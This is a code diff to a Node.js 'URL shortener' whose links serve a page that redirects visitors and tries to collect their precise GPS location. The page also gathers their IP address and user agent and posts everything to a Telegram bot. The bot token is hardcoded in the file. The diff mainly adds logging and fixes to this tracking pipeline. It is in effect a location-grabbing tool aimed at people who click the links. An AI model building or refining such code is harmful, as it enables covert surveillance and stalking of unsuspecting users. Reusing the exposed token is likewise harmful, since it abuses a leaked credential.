@@ -6,8 +6,8 @@ require('dotenv').config();
 
 const app = express();
 app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 app.use(express.static('.'));
 
 const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
@@ -21,6 +21,8 @@ function generateShortCode() {
 
 async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
   try {
+    console.log('[TG] Sending:', { shortCode, gps });
+    
     let msg = `
 🔗 رابط فُتح!
 ━━━━━━━━━━━
@@ -50,17 +52,21 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
 ⏰ ${new Date().toISOString()}
     `.trim();
 
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      { chat_id: TELEGRAM_CHAT_ID, text: msg }
+    const result = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      { chat_id: TELEGRAM_CHAT_ID, text: msg },
+      { timeout: 5000 }
     );
-    console.log('[Telegram] Message sent successfully');
+    
+    console.log('[TG] Success:', result.data.ok);
   } catch (err) {
-    console.error('[Telegram] Error:', err.message);
+    console.error('[TG] Error:', err.message);
   }
 }
 
 app.post('/api/shorten', (req, res) => {
   const { url } = req.body;
+  console.log('[API] Shorten request:', url);
+  
   if (!url) return res.status(400).json({ error: 'URL required' });
 
   const shortCode = generateShortCode();
@@ -71,35 +77,58 @@ app.post('/api/shorten', (req, res) => {
   };
 
   const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
+  console.log('[API] Generated:', shortenedUrl);
+  
   res.json({ shortened: shortenedUrl, code: shortCode });
 });
 
 // API لتسجيل الموقع
-app.post('/api/log-visit', (req, res) => {
-  const { code, gps } = req.body;
-  
-  console.log('[Log] Visit logged:', { code, gps });
-  
-  if (linkStorage[code]) {
-    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
-    const userAgent = req.get('user-agent');
-    const originalUrl = linkStorage[code].original;
+app.post('/api/log-visit', express.text(), (req, res) => {
+  try {
+    console.log('[LOG] Raw body:', req.body);
     
-    linkStorage[code].clicks++;
+    let data = {};
+    if (typeof req.body === 'string') {
+      data = JSON.parse(req.body);
+    } else {
+      data = req.body;
+    }
     
-    // أرسل بدون انتظار
-    sendToTelegram(ip, code, originalUrl, userAgent, gps);
+    const { code, gps } = data;
+    console.log('[LOG] Parsed:', { code, gps });
+    
+    if (linkStorage[code]) {
+      const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
+      const userAgent = req.get('user-agent');
+      const originalUrl = linkStorage[code].original;
+      
+      linkStorage[code].clicks++;
+      
+      console.log('[LOG] Sending to TG:', { code, ip, gps });
+      sendToTelegram(ip, code, originalUrl, userAgent, gps);
+    } else {
+      console.log('[LOG] Code not found:', code);
+    }
+    
+    res.json({ ok: true });
+  } catch (err) {
+    console.error('[LOG] Error:', err.message);
+    res.status(500).json({ error: err.message });
   }
-  
-  res.json({ ok: true });
 });
 
 // Redirect فوري
 app.get('/:code', (req, res) => {
   const { code } = req.params;
-  if (!linkStorage[code]) return res.status(404).send('Not found');
+  console.log('[REDIRECT] Code:', code);
+  
+  if (!linkStorage[code]) {
+    console.log('[REDIRECT] Not found');
+    return res.status(404).send('Not found');
+  }
 
   const originalUrl = linkStorage[code].original;
+  console.log('[REDIRECT] Original URL:', originalUrl);
   
   res.send(`
 <!DOCTYPE html>
@@ -110,66 +139,71 @@ app.get('/:code', (req, res) => {
 </head>
 <body>
   <script>
-    (function() {
-      const code = '${code}';
-      const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
-      const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit';
+    console.log('Script loaded');
+    const code = '${code}';
+    const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
+    const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit';
+    
+    console.log('Code:', code);
+    console.log('API URL:', apiUrl);
+    
+    // Redirect فوري
+    window.location.href = originalUrl;
+    
+    // جمع GPS
+    setTimeout(() => {
+      console.log('GPS timeout triggered');
       
-      // Redirect فوري
-      window.location.href = originalUrl;
-      
-      // جمع GPS في الخلفية
-      setTimeout(() => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              // أرسل GPS
-              fetch(apiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  code: code,
-                  gps: {
-                    lat: position.coords.latitude,
-                    lng: position.coords.longitude,
-                    accuracy: position.coords.accuracy
-                  }
-                }),
-                keepalive: true
-              }).catch(e => console.log('Fetch error:', e));
-            },
-            (error) => {
-              // لو فشل GPS، أرسل بدونه
-              fetch(apiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  code: code,
-                  gps: null
-                }),
-                keepalive: true
-              }).catch(e => console.log('Fetch error:', e));
-            },
-            { 
-              enableHighAccuracy: true,
-              timeout: 3000,
-              maximumAge: 0
-            }
-          );
-        } else {
-          // لو ما في GPS
-          fetch(apiUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
+      if (navigator.geolocation) {
+        console.log('Geolocation available');
+        
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            console.log('GPS success:', position.coords);
+            
+            const payload = {
               code: code,
-              gps: null
-            }),
-            keepalive: true
-          }).catch(e => console.log('Fetch error:', e));
-        }
-      }, 100);
-    })();
+              gps: {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy
+              }
+            };
+            
+            console.log('Sending:', JSON.stringify(payload));
+            
+            fetch(apiUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+              keepalive: true
+            }).then(r => console.log('Fetch success')).catch(e => console.log('Fetch error:', e));
+          },
+          (error) => {
+            console.log('GPS error:', error.message);
+            
+            const payload = { code: code, gps: null };
+            fetch(apiUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+              keepalive: true
+            }).then(r => console.log('Fetch success (no GPS)')).catch(e => console.log('Fetch error:', e));
+          },
+          { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
+        );
+      } else {
+        console.log('Geolocation NOT available');
+        
+        const payload = { code: code, gps: null };
+        fetch(apiUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          keepalive: true
+        }).catch(e => console.log('Fetch error:', e));
+      }
+    }, 200);
   </script>
 </body>
 </html>
@@ -178,4 +212,3 @@ app.get('/:code', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server on ${PORT}`));
-// hi fsdsdsd
